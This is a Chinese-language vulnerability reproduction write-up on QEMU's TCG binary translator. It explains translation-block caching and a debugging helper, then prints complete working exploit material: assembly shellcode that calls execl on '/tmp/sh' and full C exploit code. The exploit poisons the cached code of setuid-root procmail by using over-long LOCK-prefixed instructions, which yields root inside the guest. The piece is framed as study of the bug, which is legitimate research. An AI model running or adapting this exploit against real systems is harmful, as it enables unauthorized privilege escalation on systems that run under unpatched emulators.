## 前言

该漏洞出现在 qemu 的 tcg 中，在硬件辅助加速虚拟化技术出现之前 qemu 就是利用 tcg 来实现将虚拟机的指令集翻译成主机的指令集，然而
qemu 中关于 tcg 的洞特别的少，洞之所以少也是因为在硬件辅助虚拟化技术出现之后 tcg 不会经常被使用到了。本着学习 tcg
原理的目的所以选择复现该漏洞。

## TCG 相关知识

### TCG 翻译过程简述

TCG动态二进制翻译技术采用基本块作为翻译单元，动态翻译器会把翻译和优化的结果缓存起来,再次执行该基本块时，就可以直接执行预存起来的翻译后代码。所谓基本块就是以控制转移指令结尾的指令序列，是只有一个人口和一个出口的程序段。选择基本块作为翻译单元，相对于以单条指令为单位的翻译，可节省很多有关翻译块调用的操作,同时可以充分挖掘基本块内指令的并行性,给动态翻译提供更多的优化空间。TCG动态翻译引擎几乎全部用C语言编写,并创建了一一个中间表示层来隔离目标码翻译与宿主机器码生成过程。简要的生成过程如下所示：![](https://image.3001.net/images/20211118/1637202429_6195b9fd2f4087efd222e.png!small)

### TCG 动态翻译的核心可以理解为下面这样一个循环：

1\. 在翻译缓存中查询下条将要执行指令对应的翻译块，如果成果则执行步骤 4

2\. 将基本块翻译为由 TCG 操作组成的中间码

3\. 将基本块对应的中间操作翻译为宿主码，并存放在缓存中

4\. 以函数调用的方式执行下条将要执行指令所对应的翻译块

5\. 从翻译块中返回，转步骤 1 继续执行

### TCG 翻译块查找过程

翻译块会存放在哈希表中，该表以物理地址作为关键码值，由散列函数映射到表中一个位置，由于在物理地址哈希表中查找时需要现将虚拟地址转换为物理地址，确定散列为之后还需遍历链表，查找效率较低，为此，还定义了虚拟地址哈希表，用于存放最近使用过的翻译块以进行快速查找。虚拟地址哈希标以虚拟地址作为关键码值，并采用与物理地址哈希表不同的散列函数，表中每个地址仅存放最近一次被查找的翻译块。

翻译块的查找过程：

1\. 查找虚拟地址哈希表，如果相应位置元素即为所查找的翻译块，则返回

2\. 查询物理地址哈希表，如果成功，更新虚拟地址哈希表，返回

3\. 动态翻译以虚拟地址为起始的基本块，生成所查找的翻译块

4\. 将生成的翻译块存入物理地址哈希表

5\. 将生成的翻译块存入虚拟地址哈希表

6\. 返回生成的翻译块

TCG 上下文简述

TCG 上下文主要包含三类信息：内存池、标号和变量，内存池是为了减少频繁的调用内存分配与释放系统调用所带来的开销，标号是为了使 TCG
可以使用与汇编程序中需要用标号表示转移的目标地址相似的功能，变量则用于辅助完成目标码到宿主机器码到转换。

## 让一个程序默认以 root 权限运行

先使用 root 权限创建一个可执行的二进制程序，然后调用 chmod u+s 命令即可使这个二进制程序在执行时把进程的属主或组ID置为该文件的文件属主。

也就是可以达到如下效果：

![](https://image.3001.net/images/20211118/1637202502_6195ba46e4263589a28ee.png!small)

## 漏洞利用原理

漏洞主要利用到 TCG 的以下机制：

\- TCG 会在寻找已经翻译过的基本块时检测其物理地址与虚拟地址是否匹配

\- TCG 会在指令过长的时候强制停止对基本块的翻译

首先需要知道 TCG 会缓存被翻译过的基本块，也就是说我们创建的被注入的程序的翻译过的代码会缓存在 TCG
的内存池中。为了方便我们将被注入的程序称为恶意程序。

在真实的 x86 处理器上有最大指令长度限制，限制为 15 字节，但是 qemu
的指令解码器没有设置指令长度的限制以及指令前缀数量的限制。这就可以让我们创建一个长度任意的指令，创建方法就是添加多个 LOCK 前缀。

假设当前已经添加了多个 LOCK 前缀，添加后的指令长度足以使得触发 TCG
会在指令过长时强制停止对基本块的翻译的机制，此时调用修改过的指令，会先去寻找对应的基本块，因为基本块已经被翻译过且被缓存过，此时就会将虚拟地址的内存映射到原本缓存过的物理地址空间，相当于变相的更新了基本块的内容，更新的内容为已经注入过的恶意程序代码。

将恶意程序的地址映射到 exp 程序的进程中，在映射的内存中添加 shellcode 以及过长的指令，然后在 exp
中执行被修改的映射的内存中的代码，此时就会将此处的内存映射到对应的物理地址上，之后再单独执行恶意程序，执行恶意程序时会直接去执行之前缓存的基本块中的代码以提升速度，但此时基本块中的代码已经被替换为
shellcode，之后即会执行 shellcode 来达到虚拟机内部提取权限的目的。

## 漏洞利用限制条件

根据漏洞报告中的内容，已知要想使用漏洞发现者提供的 exp 则必须使用指定版本的 procmail 才可以成功运行 exp。

使用 procmail 是因为其是以 root 权限运行的，选用以 root 权限运行的程序是因为我们注入的代码同样需要高权限才可以运行。

不过这个限制条件就使得这个漏洞可以被利用的场景大大减少，不过在复现中我们可以自己使用 root 权限创建一个程序，并且让这个程序也使用 root
权限启动，让这个程序作为我们后面注入的程序，同时因为这个程序是我们自己创建的所以我们需要的一些信息也很容易被获取到，如 excel 函数的 libc
地址，创建这样的程序方法可以使用上面介绍过的方法。

我们自己创建的程序在编译时需要关闭 PIE，关闭 PIE 的目的是为了能更容易的获取到 GOT 表地址，从而获取到函数在 libc
中的地址，而且尽量让创建的程序内容稍微的多一些，内容太少的话不能构造出三个页，这样我们也就没办法把 shellcode 插进去。

## 漏洞环境

qemu 版本：2.9.0

注入的 procmail 版本：3.22-24

procmail 下载地址：
<http://ftp.debian.org/debian/pool/main/p/procmail/procmail_3.22-24+deb8u1_amd64.deb>

## 如何调试

调试的时候主要需要清楚要注入的程序什么时候就已经被翻译了并生成了对应的 TB 块，以及怎么利用虚拟机的物理地址获取到其在 Qemu 上的虚拟地址（GPA
-> HVA）。

 **GPA - > HVA 的转换**

最开始我查询的方法还是使用 /proc/pid/pagemap 来经过一系列计算获取到虚拟机的物理地址，手动计算出该物理地址在 Qemu
中的虚拟地址，但是查看该虚拟地址处的内存的值是和虚拟机里的值是不一样的，后来在 gdb 中使用 find 命令查找到了在虚拟机指定的值的值在 Qemu
中的虚拟地址，发现该物理地址与计算出来的差了 0x40000000，经过检查发现该物理地址的计算并没有错误，出现问题的点在于因为漏洞是出现在了 TCG
这里，所以启动选项中没有加 --enable-kvm，也就是说现在的内存管理不是结合 kvm
来做的内存管理，而是完全利用软件来实现的内存管理，所以计算出来的是会差 0x4000000，在使用 kvm 做内存管理时是不会出现这个问题的。

为了解决这个问题我们可以在计算时把多出来的值直接减掉，我这里使用了另一个方法，就是使用 qemu 官方提供的工具 ****hmp**** ，在平时的调试中
hmp 有很多对漏洞复现有用的命令比直接在 gdb 中调试要快一些，不过 gdb 中有些功能 hmp 也没办法替代。

在 clone 下来的源代码目录下会有一个 hmp-command.hx 文件，该文件中存放着部分 hmp 命令的相关信息，比如命令的名字、help
命令时的输出等等，其中我在 qemu-4.0.0 的 hmp-command.hx 中发现 qemu-4.0.0 提供一个 gpa2hva
的功能，命令的描述也是说把虚拟机的物理地址转换为 qemu 的虚拟地址，但是在我们漏洞复现的环境中的 hmp
没有提供该功能，但是我看了一下这个功能是怎么实现的，发现其在 2.9.0 上也可以实现并且不用自行实现一些 2.9.0 中没有的函数，只需要在 hmp-commands.hx 中添加上相应的描述，然后在 monitor.c 中添加上实现的函数。

    
    
    hmp-commands.hx:
    
        {
            .name       = "gpa2hva",
            .args_type  = "addr:l",
            .params     = "addr",
            .help       = "print the host virtual address corresponding to a guest physical address",
            .cmd        = hmp_gpa2hva,
        },
    
    STEXI
    @item gpa2hva @var{addr}
    @findex gpa2hva
    Print the host virtual address at which the guest's physical address @var{addr}
    is mapped.
    ETEXI
    
    ----------------------------------------------------------------------    monitor.c:
    static void *gpa2hva(MemoryRegion **p_mr, hwaddr addr, Error **errp)
    {
        MemoryRegionSection mrs = memory_region_find(get_system_memory(),
                                                     addr, 1);
    
        if (!mrs.mr) {
            //error_setg(errp, "No memory is mapped at address 0x%" HWADDR_PRIx, addr);
            return NULL;
        }
    
        if (!memory_region_is_ram(mrs.mr) && !memory_region_is_romd(mrs.mr)) {
            //error_setg(errp, "Memory at address 0x%" HWADDR_PRIx "is not RAM", addr);
            memory_region_unref(mrs.mr);
            return NULL;
        }
    
        *p_mr = mrs.mr;
        return qemu_map_ram_ptr(mrs.mr->ram_block, mrs.offset_within_region);
    }
    
    static void hmp_gpa2hva(Monitor *mon, const QDict *qdict)
    {
        hwaddr addr = qdict_get_int(qdict, "addr");
        Error *local_err = NULL;
        MemoryRegion *mr = NULL;
        void *ptr;
    
        ptr = gpa2hva(&mr, addr, &local_err);
        if (local_err) {
            error_report_err(local_err);
            return;
        }
    
        monitor_printf(mon, "Host virtual address for 0x%" HWADDR_PRIx
                       " (%s) is %p\n",
                       addr, mr->name, ptr);
    
        memory_region_unref(mr);
    }

添加完之后在启动时添加 -monitor stdio 命令就可以使用 hmp 了，现在也就可以很愉快的进行 GPA -> HVA 的转换了。

 **查看何时代码被翻译并生成了对应的 TB 块**

我们首先 mmap 要注入的程序到当前进程，此时我们就可以获取到注入的程序的代码存储在了 qemu 的哪里（利用上面的 GPA ->
HVA），翻译代码的地方下断点以及下内存短点，经过观察可以发现当我们 mmap 代码到当前进程时该代码就已经被翻译并且生成了对应的 TB
块，这是因为当前进程是正在运行着的所以该进程中的代码是会被实时翻译。

## 编写 EXP

写 Exp 的时候我们使用的还是 procmail 并且和漏洞报告中的版本是一致的，这是因为该版本的 procmail 编译是没有加 pie
的其他能下载到的版本都加了 pie 而且 procmail 本身就是会以 root 权限启动的。

首先 mmap procmail 到进程中，这里 mmap procmail 的哪部分不是随便的而是需要计算一下的，在 ghidra 中我们找一下
procmail 的 main 函数地址，可以得到 main 函数的起始地址为 0x4031c0 结束地址为 0x4040f6，为了能让我们注入的
shellcode 肯定会被执行，我们选择将其注入到离 main 函数比较近的地方，所以我们选择将代码注入到 0x4000 这个页。所以在 mmap
的时候我们将从 0x3000 起始的 3 个页映射到当前进程中。这里我们将这 3 个页分别称为 A、B、C。

之后将页 B 的内容移到页 C 上面去，然后将 shellcode 映射到页 B 原先所在地位置，虽然此时我们也更新了当前进程中的代码但是由于不是第一次
mmap 的所以对应的 TB 块是不会被刷新的。

shellcode 中我们主要就是设置 execl 函数的执行环境，首先因为 __libc_start_main 和 execl 都是在 libc
中的函数所以其偏移都是固定的，我们就可以通过当前进程获取到两个函数的偏移，然后在 ghidra 中查看一下 __libc_start_main 的 GOT
表地址，然后更新一下 shellcode 中的 GOT 表地址和偏移。该 shellcode 没有使用 syscall 而是设置了 execl
的执行环境然后将 execl 函数的地址设置为了返回地址，也就是说在返回的时候会直接转去执行 execl 函数。

    
    
    bits 64
    
    start:
    
    ; return address: execl
    mov r8, 0xdeaddeaddeaddead ; LIBC_START_MAIN_GOT_ADDR
    mov r8, [r8] ; __libc_start_main
    mov r9, 0xbeefbeefbeefbeef ; EXECL_OFFSET
    add r8, r9 ; execl
    mov [rsp], r8
    
    ; write "/tmp/sh\0" to stack
    lea rdi, [rsp + 0x100]
    mov dword [rdi+0], 0x706d742f 
    mov dword [rdi+4], 0x0068732f
    
    ; set up args
    ; execl(rdi="/tmp/sh", rsi="/tmp/sh", rdx=NULL)
    mov rsi, rdi
    mov rdx, 0
    mov rax, 0
    
    align 0x1000, db 0xf0

然后需要移动一下 shellcode 的位置，因为我们是想让 shellcode 紧接着页 A 的代码去执行，所以我们需要看一下页 A
的最后一条指令的地址是多少，最后一条指令的地址为 0x403ffb 该指令的下一条指令的地址为 0x404002，所以我们需要将 shellcode 往后以
2 字节。

所有的构造基本就已经结束了，现在我们在子进程中调用 shellcode 就可以了，这时因为指令前缀过长就会停止翻译，也就不会破坏原本页 C
中的内容，但是因为已经翻译了一部分这部分就会被更新到 TB 块中，更新的内容也就是我们的 shellcode。

因为 shellcode 的代码在当前进程执行是会报错的，我们直接使用 wait 等待系统将其回收掉，等到系统将其回收了之后，我们再创建一个子进程调用
procmail 此时就会执行缓存过的 TB 块，也就是我们的 shellcode，从而达到提高权限的目的。

效果如下：![](https://image.3001.net/images/20211118/1637203058_6195bc72cfe7baba6e184.png!small)

Exp 代码：

    
    
    #define _GNU_SOURCE
    #include <stdint.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <err.h>
    #include <unistd.h>
    #include <dlfcn.h>
    #include <string.h>
    #include <sys/wait.h>
    
    #define TARGET_LOAD_ADDR 0x400000
    #define EVIL_PAGE_OFFSET 0x4000
    #define LIBC_START_MAIN_GOT_ADDR 0x615160
    #define BASIC_BLOCK_START 0x403ffb
    
    int main() {
        system("cp sh /tmp/sh");
    
        uint64_t ExeclOffset = ((char *)dlsym(RTLD_DEFAULT, "execl")) - ((char *)dlsym(RTLD_DEFAULT, "__libc_start_main"));
        
        printf("[*] EvelOffset is 0x%lx\n", ExeclOffset);
    
        int ProcmailFd = 0;
    
        if ((ProcmailFd = open("/usr/bin/procmail", O_RDONLY)) == -1)
            perror("open procmail failed");
    
        char * LoadAddr = (char *)(TARGET_LOAD_ADDR + EVIL_PAGE_OFFSET - 0x1000);
    
        if (mmap(LoadAddr, 0x3000, PROT_EXEC | PROT_READ, 
                MAP_LOCKED | MAP_SHARED, ProcmailFd, EVIL_PAGE_OFFSET - 0x1000) != LoadAddr)
            perror("mmap procmail Failed");
        
        if (mremap(LoadAddr + 0x1000, 0x1000, 0x1000, MREMAP_MAYMOVE | MREMAP_FIXED, LoadAddr + 0x2000) != LoadAddr + 0x2000)
            perror("mremap failed");
    
        int ShellcodeFd = 0;
        if ((ShellcodeFd = open("shellcode", O_RDONLY)) == -1)
            perror("open shellcode failed");
    
        char * ShellcodeAddr = LoadAddr + 0x1000;
        if (mmap(ShellcodeAddr, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED, ShellcodeFd, 0) != ShellcodeAddr)
            perror("mmap shellcode failed");
    
        char Flag1[8];
        char Flag2[8];
    
        *(uint64_t *)Flag1 = 0xdeaddeaddeaddead;
        *(uint64_t *)Flag2 = 0xbeefbeefbeefbeef;
    
        char * Tmp;
    
        Tmp = memmem(ShellcodeAddr, 0x1000, Flag1, 8);
        uint64_t * LibcStartGotAddress = (void *)Tmp;
        Tmp = memmem(ShellcodeAddr, 0x1000, Flag2, 8);
        uint64_t * ExeclAddress = (void *)Tmp;
    
        *LibcStartGotAddress = LIBC_START_MAIN_GOT_ADDR;
        *ExeclAddress = (uint64_t)ExeclOffset;
    
        memmove(ShellcodeAddr + 2, ShellcodeAddr, 0x1000 - 2);
        memcpy(ShellcodeAddr, ShellcodeAddr + 0x1000, 2);
    
        ShellcodeAddr[0xfff] = 0xc2;
    
        if (mprotect(ShellcodeAddr, 0x1000, PROT_READ | PROT_EXEC))
            perror("mprotect failed");
        
        printf("[*] Evil Page Setup Successed\n");
    
        pid_t Child = fork();
        if (Child ==  -1)
            perror("creat child process failed");
        if (Child == 0) {
            asm volatile("fninit");
    
            ((void(*)(void))BASIC_BLOCK_START)();
    
            return 0;
        }
    
        int Status;
        if (wait(&Status) != Child)
            perror("unable to wait for child");
    
        printf("[*] Now TB Cache is updated\n");
    
        Child = fork();
        if (Child ==  -1)
            perror("creat child process failed");
        if (Child == 0) {
            close(0);
    
            execlp("procmail", "procmail", NULL);
            perror("ececlp failed");
        }
        if (wait(&Status) != Child)
            perror("unable to wait for child");
    
        return 0;
    }

